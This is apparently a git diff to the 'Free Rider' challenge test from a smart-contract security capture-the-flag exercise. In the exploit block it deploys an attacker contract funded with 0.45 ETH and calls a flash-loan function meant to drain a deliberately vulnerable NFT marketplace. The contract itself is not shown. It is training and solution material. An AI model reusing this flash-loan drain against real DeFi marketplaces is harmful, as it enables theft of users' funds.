@@ -105,23 +105,19 @@ describe('[Challenge] Free Rider', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
-        // Eth to WEth
-        await this.weth.connect(attacker).deposit({value: ethers.utils.parseEther('0.45')});
-
-        console.log(await this.weth.balanceOf(attacker.address));
-
         const freeRiderFactory = await ethers.getContractFactory('FreeRider', attacker);
         freeRiderContract = await freeRiderFactory.deploy(
             this.uniswapPair.address,
             this.weth.address,
             this.nft.address,
             this.marketplace.address,
-            this.buyerContract.address
+            this.buyerContract.address,
+            {value: ethers.utils.parseEther('0.45')}
         );
         await this.weth.connect(attacker).approve(freeRiderContract.address,
             this.weth.balanceOf(attacker.address));
 
-        await freeRiderContract.connect(attacker).uniswapFlashLoan();
+        await freeRiderContract.connect(attacker).uniswapFlashLoanAndFreeRide();
     });
 
     after(async function () {
